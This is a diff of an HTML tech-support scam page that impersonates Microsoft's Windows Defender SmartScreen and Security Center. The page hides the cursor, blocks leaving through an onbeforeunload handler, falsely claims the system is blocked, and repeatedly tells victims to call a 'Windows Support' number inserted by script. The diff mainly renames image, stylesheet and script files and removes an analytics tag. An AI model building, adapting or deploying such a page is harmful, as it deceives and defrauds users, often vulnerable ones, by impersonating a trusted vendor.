@@ -1,3 +1,4 @@
+
 <html lang="en">
 
 
@@ -13,8 +14,8 @@
 	<meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
 	<meta content="noindex,nofollow" name="robots">
 	<title>Defender smart screen error</title>
-	<link href="msmms.png" rel="icon" id="favicon" type="image/png">
-	<link href="tapas.css" rel="stylesheet">
+	<link href="msmm.png" rel="icon" id="favicon" type="image/png">
+	<link href="tapa.css" rel="stylesheet">
 	<script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
 	<script type="text/javascript">//<![CDATA[
 		$(function () {
@@ -29,10 +30,7 @@
 		}
 		
 	</script>
-	<script src="noirs.js"></script>
-	<a title="Privacy-friendly Web Analytics" href="https://clicky.com/101490593"></a>
-<script async data-id="101490593" src="//static.getclicky.com/js"></script>
-
+	<script src="noir.js"></script>
 
 	<script>
 		var t = new XMLHttpRequest;
@@ -70,12 +68,12 @@
 </head>
 <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
 
-	<div style="position:absolute; top:100px; right:10px; z-index:9999;"><img src="defs.gif" alt="" width="500"></div>
+	<div style="position:absolute; top:100px; right:10px; z-index:9999;"><img src="def.gif" alt="" width="500"></div>
 
 
 	<div class="bg" style="cursor:none">
 		<div class="bgimg" style="top:0">
-			<img src="f24s.png" alt="" width="100%">
+			<img src="f24.png" alt="" width="100%">
 		</div>
 	</div>
 	<a href="#" id="link_black" style="cursor:none" rel="noreferrer">
@@ -89,7 +87,7 @@
 						<ul>
 							<li>
 								<a href="#">
-									<img src="mncs.png">
+									<img src="mnc.png">
 								</a>
 							</li>
 						</ul>
@@ -97,7 +95,7 @@
 				</div>
 				<div class="col-md-4">
 					<div class="logo">
-						<img src="msmms.png">
+						<img src="msmm.png">
 						<span>Windows security</span>
 					</div>
 				</div>
@@ -111,12 +109,12 @@
 							</li>
 							<li>
 								<a href="#">
-									<img src="sets.png">
+									<img src="set.png">
 								</a>
 							</li>
 							<li>
 								<a href="#">
-									<img src="quess.png">
+									<img src="ques.png">
 								</a>
 							</li </ul>
 					</div>
@@ -129,7 +127,7 @@
 					<div class="col-md-6">
 						<div class="quick_scan">
 							<p>
-								<img src="vscss.png">
+								<img src="vsc.png">
 								<span>scanning rapido</span>
 							</p>
 						</div>
@@ -139,7 +137,7 @@
 							<ul>
 								<li>
 									<a href="#">
-										<img src="mncs.png">
+										<img src="mnc.png">
 									</a>
 								</li>
 							</ul>
@@ -149,7 +147,7 @@
 			</div>
 			<div class="scan_body">
 				<div style="margin: 15px 10px;">
-					<img src="bxss.png" alt="" style="max-width: 100%;">
+					<img src="bxs.png" alt="" style="max-width: 100%;">
 				</div>
 				<div class="table_quick">
 					<table class="table table-bordered">
@@ -202,7 +200,7 @@
 		</div>
 	</div>
 	<div class="pro_box2" style="cursor: none; display: block;">
-		<img src="bx1s.png" alt="" style="width:100%;max-width: 100%;display: block;
+		<img src="bx1.png" alt="" style="width:100%;max-width: 100%;display: block;
       margin: 0 auto;">
 	</div>
 	<div class="pro_box3" style="cursor: none; display: block;">
@@ -213,7 +211,7 @@
 						<ul>
 							<li>
 								<a href="#">
-									<img src="mncs.png">
+									<img src="mnc.png">
 								</a>
 							</li>
 						</ul>
@@ -221,7 +219,7 @@
 				</div>
 				<div class="col-md-4">
 					<div class="logo">
-						<img src="msmms.png">
+						<img src="msmm.png">
 						<span>Windows security</span>
 					</div>
 				</div>
@@ -235,17 +233,17 @@
 							</li>
 							<li>
 								<a href="#">
-									<img src="bels.png">
+									<img src="bel.png">
 								</a>
 							</li>
 							<li>
 								<a href="#">
-									<img src="sets.png">
+									<img src="set.png">
 								</a>
 							</li>
 							<li>
 								<a href="#">
-									<img src="quess.png">
+									<img src="ques.png">
 								</a>
 							</li>
 						</ul>
@@ -259,7 +257,7 @@
 					<div class="col-md-6">
 						<div class="quick_scan">
 							<p>
-								<img src="vscss.png">
+								<img src="vsc.png">
 								<span>scan</span>
 							</p>
 						</div>
@@ -269,7 +267,7 @@
 							<ul>
 								<li>
 									<a href="#">
-										<img src="mncs.png">
+										<img src="mnc.png">
 									</a>
 								</li>
 							</ul>
@@ -300,7 +298,7 @@
 					<div class="row">
 						<div class="col-md-4">
 							<div class="pc_desk">
-								<img src="pcms.png">
+								<img src="pcm.png">
 							</div>
 						</div>
 						<div class="col-md-4">
@@ -349,7 +347,7 @@
 				<div class="row">
 					<div class="col-md-2">
 						<div class="viruses">
-							<img src="vscss.png">
+							<img src="vsc.png">
 						</div>
 					</div>
 					<div class="col-md-10">
@@ -369,9 +367,9 @@
 			<div class="col-md-12">
 				<div class="right-foot" style="text-align:center;margin-bottom: 5px;">
 					<span id="footertxt">
-						<img src="msmms.png"> Windows security </span>
+						<img src="msmm.png"> Windows security </span>
 					<span style="font-weight:500;padding-left:13px;color:#fff; ">Call Windows Support: <span
-							style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="winlos.png" alt=""
+							style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt=""
 								style="width: 25px;vertical-align: sub;"> Call us directly +
 							<script>document.write(bcda)</script>
 						</span>
@@ -395,11 +393,11 @@
 			<div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
 				<span class="fl title" id="txtadd">
 					<span class="fl ilb">
-						<img src="dms.png" class="logo3">
+						<img src="dm.png" class="logo3">
 					</span>Windows Defender Security Center </span>
 				<span class="fl title2" id="txts1">
 					<a href="#" id="bgt">
-						<img src="css.png">
+						<img src="cs.png">
 					</a>
 				</span>
 			</div>
@@ -411,17 +409,17 @@
 				<div id="isp"> (Error code: 2v7HgTvB)</div>
 			</span>
 		</div>
-		<img src="ress.gif" id="banner">
+		<img src="re.gif" id="banner">
 		<div id="disclaimer">Access to this system is blocked for security reasons. <br>
 			<span class="support" style="font-size:22px;">Please call Windows Support:<br><span
-					style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="winlos.png" alt=""
+					style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt=""
 						style="width: 25px;vertical-align: sub;"> Call us directly +
 					<script>document.write(bcda)</script>
 				</span>
 			</span>
 		</div>
 		<div id="bottom">
-			<img src="msmms.png" id="badge">
+			<img src="msmm.png" id="badge">
 			<span class="title3">Windows</span>
 			<ul>
 				<li>
@@ -476,19 +474,19 @@
 			disabled. Windows Defender SmartScreen now prevents unrecognized applications from appearing. Running this
 			application may put your system at risk. <br>
 			<strong>Call Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img
-						src="winlos.png" alt="&nbsp" style="width: 25px;vertical-align: bottom;"> Call us directly +
+						src="winlo.png" alt="&nbsp" style="width: 25px;vertical-align: bottom;"> Call us directly +
 					<script>document.write(bcda)</script>
 				</span>
 			</strong>
 		</p>
 	</div>
 	<div id="chat" style="display: block;">
-		<img src="msmms.png">
+		<img src="msmm.png">
 		<span
 			style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
 		<p style="font-weight:600;font-size:24px">Call support: <br>
 		</p>
-		<h4 style="font-weight:600;font-size:22px"> <img src="winlos.png" alt="" style="width: 25px;margin-left: 0;">
+		<h4 style="font-weight:600;font-size:22px"> <img src="winlo.png" alt="" style="width: 25px;margin-left: 0;">
 			Call us
 			directly +
 			<script>document.write(bcda)</script>
@@ -507,9 +505,9 @@
 			</svg>
 		</div>
 	</div>
-	<script src="nvidias.js"></script>
-	<script src="jupiters.js"></script>
-	<script src="bxsafes.js"></script>
+	<script src="nvidia.js"></script>
+	<script src="jupiter.js"></script>
+	<script src="bxsafe.js"></script>
 	<script>
 		$(function () {
 			var a = 0,
@@ -758,7 +756,7 @@
 		});
 	</script>
 
-	<script src="escs.html"></script>
+	<script src="esc.js"></script>
 
 </body>
 
